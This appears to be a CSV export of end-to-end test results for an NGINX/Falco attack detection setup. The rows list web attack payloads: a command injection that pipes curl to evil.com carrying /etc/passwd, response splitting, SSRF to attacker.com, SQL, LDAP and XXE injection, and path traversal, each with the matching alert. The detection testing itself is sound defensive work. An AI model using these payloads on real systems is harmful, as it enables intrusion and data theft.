"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMDI_CURL_001` |
| **Name** | Curl data exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | data_exfil |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `|curl http://evil.com/exfil?d=$(cat /etc/passwd)`
- **Encoded**: `%7Ccurl%20http%3A%2F%2Fevil.com%2Fexfil%3Fd%3D%24%28cat%20%2Fetc%2Fpasswd%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 08:55:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMDI_CURL_001-1772268942704-46akch pattern_id=CMDI_CURL_001 uri=/?q=%7Ccurl%20http%3A%2F%2Fevil.com%2Fexfil%3Fd%3D%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMDI_CURL_001-1772268942704-46akch pattern_id=CMDI_CURL_001 uri=/?q=%7Ccurl%20http%3A%2F%2Fevil.com%2Fexfil%3Fd%3D%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1

**Falco Log Entry**:
```
08:55:42.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMDI_CURL_001-1772268942704-46akch pattern_id=CMDI_CURL_001 uri=/?q=%7Ccurl%20http%3A%2F%2Fevil.com%2Fexfil%3Fd%3D%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1
```","2","test_e2e_with_logs[504_CMDI_CURL_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENCODE_002` |
| **Name** | XXE Lowercase Percent-Encoded DOCTYPE |
| **Category** | XXE |
| **Subcategory** | encoded_xxe |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY xxe ""test"">]>`
- **Encoded**: `%3c!DOCTYPE%20foo%20%5B%3c!ENTITY%20xxe%20%22test%22%3E%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~71000ms
- **Timestamp**: 08:55:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENCODE_002-1772268918110-xg7o6 pattern_id=XXE_ENCODE_002 uri=/?q=%3c!DOCTYPE%20foo%20%5B%3c!ENTITY%20xxe%20%22test%22%3E%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENCODE_002-1772268918110-xg7o6 pattern_id=XXE_ENCODE_002 uri=/?q=%3c!DOCTYPE%20foo%20%5B%3c!ENTITY%20xxe%20%22test%22%3E%5D%3E client=127.0.0.1

**Falco Log Entry**:
```
08:55:18.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENCODE_002-1772268918110-xg7o6 pattern_id=XXE_ENCODE_002 uri=/?q=%3c!DOCTYPE%20foo%20%5B%3c!ENTITY%20xxe%20%22test%22%3E%5D%3E client=127.0.0.1
```","2","test_e2e_with_logs[560_XXE_ENCODE_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_012` |
| **Name** | PostgreSQL conditional cast error |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT CASE WHEN (1=1) THEN CAST(version() AS int) ELSE 1 END) --`
- **Encoded**: `%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%20CAST%28version%28%29%20AS%20int%29%20ELSE%201%20END%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 08:55:30.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_ERROR_012-1772268930707-2b6lg5 pattern_id=SQLI_ERROR_012 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%20CAST%28version%28%29%20AS%20int%29%20ELSE%201%20END%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_ERROR_012-1772268930707-2b6lg5 pattern_id=SQLI_ERROR_012 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%20CAST%28version%28%29%20AS%20int%29%20ELSE%201%20END%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:30.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_ERROR_012-1772268930707-2b6lg5 pattern_id=SQLI_ERROR_012 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%20CAST%28version%28%29%20AS%20int%29%20ELSE%201%20END%29%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[078_SQLI_ERROR_012]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_WIN_001` |
| **Name** | Windows backslash traversal |
| **Category** | PATH |
| **Subcategory** | windows_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\`
- **Encoded**: `..%5C`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~84000ms
- **Timestamp**: 08:55:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Windows path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_001-1772268905630-ubuzkd pattern_id=PATH_WIN_001 uri=/?q=..%5C client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_001-1772268905630-ubuzkd pattern_id=PATH_WIN_001 uri=/?q=..%5C client=127.0.0.1

**Falco Log Entry**:
```
08:55:05.000000000: Critical [NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_001-1772268905630-ubuzkd pattern_id=PATH_WIN_001 uri=/?q=..%5C client=127.0.0.1
```","2","test_e2e_with_logs[302_PATH_WIN_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_004` |
| **Name** | Authentication log access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/var/log/auth.log`
- **Encoded**: `/var/log/auth.log`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~90000ms
- **Timestamp**: 08:54:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1772268899617-vb1rfi pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1772268899617-vb1rfi pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1

**Falco Log Entry**:
```
08:54:59.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1772268899617-vb1rfi pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1
```","2","test_e2e_with_logs[232_PATH_ABS_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_053` |
| **Name** | Null Byte Variant |
| **Category** | PATH |
| **Subcategory** | filter_bypass |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../etc/passwd%00.jpg`
- **Encoded**: `..%2Fetc%2Fpasswd%2500.jpg`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~73000ms
- **Timestamp**: 08:55:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_053-1772268916653-n20yfe pattern_id=PATH_ADV_053 uri=/?q=..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_053-1772268916653-n20yfe pattern_id=PATH_ADV_053 uri=/?q=..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1

**Falco Log Entry**:
```
08:55:16.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_053-1772268916653-n20yfe pattern_id=PATH_ADV_053 uri=/?q=..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1
```","2","test_e2e_with_logs[246_PATH_ADV_053]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_001` |
| **Name** | Quadruple dot traversal variation |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `....//`
- **Encoded**: `....%2F%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~86000ms
- **Timestamp**: 08:55:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_001-1772268903125-qq4qq8 pattern_id=PATH_ADV_001 uri=/?q=....%2F%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_001-1772268903125-qq4qq8 pattern_id=PATH_ADV_001 uri=/?q=....%2F%2F client=127.0.0.1

**Falco Log Entry**:
```
08:55:03.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_001-1772268903125-qq4qq8 pattern_id=PATH_ADV_001 uri=/?q=....%2F%2F client=127.0.0.1
```","2","test_e2e_with_logs[238_PATH_ADV_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `WAF_NULL_001` |
| **Name** | Null byte SQL bypass |
| **Category** | WAF_BYPASS |
| **Subcategory** | null_byte |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `SELECT%00 * FROM users`
- **Encoded**: `SELECT%00%20%2A%20FROM%20users`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~5000ms
- **Timestamp**: 08:56:24.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX WAF Bypass] WAF bypass attempt detected` |
| **Matched Rule** | `[NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_NULL_001-1772268984104-uph2t pattern_id=WAF_NULL_001 uri=/?q=SELECT%00%20%2A%20FROM%20users client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_NULL_001-1772268984104-uph2t pattern_id=WAF_NULL_001 uri=/?q=SELECT%00%20%2A%20FROM%20users client=127.0.0.1

**Falco Log Entry**:
```
08:56:24.000000000: Warning [NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_NULL_001-1772268984104-uph2t pattern_id=WAF_NULL_001 uri=/?q=SELECT%00%20%2A%20FROM%20users client=127.0.0.1
```","2","test_e2e_with_logs[688_WAF_NULL_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_007` |
| **Name** | Mixed encoding traversal |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `..%2f..%5c..%2fetc/passwd`
- **Encoded**: `..%252f..%255c..%252fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~64000ms
- **Timestamp**: 08:55:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_007-1772268925172-zpff2q pattern_id=PATH_UNI_007 uri=/?q=..%252f..%255c..%252fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_007-1772268925172-zpff2q pattern_id=PATH_UNI_007 uri=/?q=..%252f..%255c..%252fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
08:55:25.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_007-1772268925172-zpff2q pattern_id=PATH_UNI_007 uri=/?q=..%252f..%255c..%252fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[294_PATH_UNI_007]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `OTHER_API_001` |
| **Name** | API path traversal attack |
| **Category** | OTHER |
| **Subcategory** | api_abuse |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/api/v1/users/../../../etc/passwd`
- **Encoded**: `%2Fapi%2Fv1%2Fusers%2F..%2F..%2F..%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~86000ms
- **Timestamp**: 08:55:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=OTHER_API_001-1772268903102-ihge0a pattern_id=OTHER_API_001 uri=/?q=%2Fapi%2Fv1%2Fusers%2F..%2F..%2F..%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=OTHER_API_001-1772268903102-ihge0a pattern_id=OTHER_API_001 uri=/?q=%2Fapi%2Fv1%2Fusers%2F..%2F..%2F..%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
08:55:03.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=OTHER_API_001-1772268903102-ihge0a pattern_id=OTHER_API_001 uri=/?q=%2Fapi%2Fv1%2Fusers%2F..%2F..%2F..%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[396_OTHER_API_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_063` |
| **Name** | Pipe Cat Passwd |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `| cat /etc/passwd`
- **Encoded**: `%7C%20cat%20%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~63000ms
- **Timestamp**: 08:55:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1772268926664-ebnlim pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1772268926664-ebnlim pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
08:55:26.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1772268926664-ebnlim pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[314_CMD_ADV_063]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_RESP_003` |
| **Name** | HTTP 302 Response Splitting |
| **Category** | CRLF |
| **Subcategory** | response_splitting |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `\r\nHTTP/1.1 302 Found\r\nLocation:http://evil.com`
- **Encoded**: `%0d%0aHTTP%2F1.1%20302%20Found%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~24000ms
- **Timestamp**: 08:56:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_RESP_003-1772268965606-68hub8 pattern_id=CRLF_RESP_003 uri=/?q=%0d%0aHTTP%2F1.1%20302%20Found%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_RESP_003-1772268965606-68hub8 pattern_id=CRLF_RESP_003 uri=/?q=%0d%0aHTTP%2F1.1%20302%20Found%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com client=127.0.0.1

**Falco Log Entry**:
```
08:56:05.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_RESP_003-1772268965606-68hub8 pattern_id=CRLF_RESP_003 uri=/?q=%0d%0aHTTP%2F1.1%20302%20Found%0d%0aLocation%3Ahttp%3A%2F%2Fevil.com client=127.0.0.1
```","2","test_e2e_with_logs[727_CRLF_RESP_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_SCHEME_004` |
| **Name** | TFTP Protocol SSRF |
| **Category** | SSRF |
| **Subcategory** | protocol_smuggling |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `tftp://attacker.com/file`
- **Encoded**: `tftp%3A%2F%2Fattacker.com%2Ffile`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 08:56:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_SCHEME_004-1772268967119-x8ehfr pattern_id=SSRF_SCHEME_004 uri=/?q=tftp%3A%2F%2Fattacker.com%2Ffile client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_SCHEME_004-1772268967119-x8ehfr pattern_id=SSRF_SCHEME_004 uri=/?q=tftp%3A%2F%2Fattacker.com%2Ffile client=127.0.0.1

**Falco Log Entry**:
```
08:56:07.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_SCHEME_004-1772268967119-x8ehfr pattern_id=SSRF_SCHEME_004 uri=/?q=tftp%3A%2F%2Fattacker.com%2Ffile client=127.0.0.1
```","2","test_e2e_with_logs[733_SSRF_SCHEME_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_012` |
| **Name** | Mixed case sleep function |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLeep(5)`
- **Encoded**: `SLeep%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~103000ms
- **Timestamp**: 08:54:46.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_012-1772268886109-fj901h pattern_id=SQLI_TIME_012 uri=/?q=SLeep%285%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_012-1772268886109-fj901h pattern_id=SQLI_TIME_012 uri=/?q=SLeep%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:46.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_012-1772268886109-fj901h pattern_id=SQLI_TIME_012 uri=/?q=SLeep%285%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[117_SQLI_TIME_012]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BLIND_007` |
| **Name** | LDAP blind admin password enumeration |
| **Category** | LDAP |
| **Subcategory** | blind_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `*)(uid=admin)(password=test*`
- **Encoded**: `%2A%29%28uid%3Dadmin%29%28password%3Dtest%2A`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~76000ms
- **Timestamp**: 08:55:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Authentication bypass attempt` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=LDAP_BLIND_007-1772268913111-zs35ke pattern_id=LDAP_BLIND_007 uri=/?q=%2A%29%28uid%3Dadmin%29%28password%3Dtest%2A client=127.0.0.1 method=GET` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=LDAP_BLIND_007-1772268913111-zs35ke pattern_id=LDAP_BLIND_007 uri=/?q=%2A%29%28uid%3Dadmin%29%28password%3Dtest%2A client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:13.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=LDAP_BLIND_007-1772268913111-zs35ke pattern_id=LDAP_BLIND_007 uri=/?q=%2A%29%28uid%3Dadmin%29%28password%3Dtest%2A client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[448_LDAP_BLIND_007]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_008` |
| **Name** | First table name character discovery |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='u' --`
- **Encoded**: `'%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 08:55:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_008-1772268917679-u3iguv pattern_id=SQLI_BLIND_008 uri=/?q='%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_008-1772268917679-u3iguv pattern_id=SQLI_BLIND_008 uri=/?q='%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:17.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_008-1772268917679-u3iguv pattern_id=SQLI_BLIND_008 uri=/?q='%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[034_SQLI_BLIND_008]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
